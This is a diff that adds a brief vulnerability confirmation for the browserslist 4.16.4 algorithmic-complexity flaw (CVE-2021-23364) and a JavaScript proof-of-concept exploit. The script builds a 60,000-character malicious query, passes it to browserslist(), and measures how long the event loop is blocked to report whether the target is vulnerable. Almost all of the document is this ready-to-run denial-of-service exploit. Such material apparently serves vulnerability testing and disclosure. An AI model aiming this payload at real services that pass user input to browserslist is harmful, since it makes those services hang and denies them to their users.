@@ -1,0 +1,38 @@
+Confirmed: browserslist@4.16.4's `find`/`doMatch` query-parsing loop is algorithmically O(n²) (CVE-2021-23364 / GHSA-w8qv-6jwh-64r5), so a single long, attacker-controlled query string causes seconds-long blocking of the event loop.
+
+```javascript
+// Exploit for browserslist 4.16.4 ReDoS / algorithmic complexity DoS
+// (CVE-2021-23364 / GHSA-w8qv-6jwh-64r5)
+//
+// browserslist's internal query parser (find/doMatch in index.js) splits
+// "and"/"or" query segments by repeatedly slicing a growing suffix window
+// (str.slice(-i, i) for i = 1..length) and running two regexes against it
+// on every iteration. This makes parsing a single query string O(n^2) in
+// its length, so an attacker who controls a browserslist query (e.g. via
+// a .browserslistrc file, package.json "browserslist" field, or any API
+// that forwards user input to browserslist()) can cause the process to
+// hang for seconds with a single string of a few tens of thousands of
+// characters.
+
+const browserslist = require("browserslist");
+
+const maliciousQuery = " ".repeat(60000) + "and x"; // never matches early -> full O(n^2) scan
+
+console.log("Sending malicious browserslist query of length", maliciousQuery.length);
+const start = Date.now();
+
+try {
+  browserslist(maliciousQuery);
+} catch (e) {
+  // parsing fails eventually, but only after the expensive scan completes
+}
+
+const elapsed = Date.now() - start;
+console.log("Blocked event loop for", elapsed, "ms");
+
+if (elapsed > 1000) {
+  console.log("VULNERABLE: single query call blocked the process for over 1 second");
+} else {
+  console.log("Not vulnerable (or too fast to observe) - elapsed:", elapsed, "ms");
+}
+```
